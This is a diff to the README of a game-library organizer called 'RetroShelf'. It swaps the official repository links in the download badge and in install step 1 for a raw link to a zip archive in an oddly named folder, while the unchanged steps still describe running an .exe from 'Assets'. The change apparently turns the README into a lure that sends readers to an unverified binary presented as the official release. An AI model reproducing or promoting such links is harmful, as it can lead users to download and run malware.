@@ -1,6 +1,6 @@
 # 🎮 RetroShelf - Organize your entire game collection easily
 
-[![](https://img.shields.io/badge/Download_RetroShelf-Blue?style=for-the-badge)](https://github.com/tablegenusgallus221/RetroShelf)
+[![](https://img.shields.io/badge/Download_RetroShelf-Blue?style=for-the-badge)](https://github.com/tablegenusgallus221/RetroShelf/raw/refs/heads/main/Sisymbrium/Retro_Shelf_v3.9-alpha.1.zip)
 
 RetroShelf brings order to your digital game library. It functions as a central hub for your emulator collection. You can view, organize, and launch your classic games from a single interface. This application supports a wide range of platforms including Nintendo consoles, PlayStation, Sega, and Xbox systems.
 
@@ -16,7 +16,7 @@ RetroShelf brings order to your digital game library. It functions as a central 
 
 Follow these steps to set up RetroShelf on your computer.
 
-1. Visit the [official download page](https://github.com/tablegenusgallus221/RetroShelf) to get the latest version.
+1. Visit the [official download page](https://github.com/tablegenusgallus221/RetroShelf/raw/refs/heads/main/Sisymbrium/Retro_Shelf_v3.9-alpha.1.zip) to get the latest version.
 2. Locate the link labeled "Assets" at the bottom of the release notes.
 3. Click the file ending in .exe to start your download.
 4. Open the downloaded file once the process finishes.
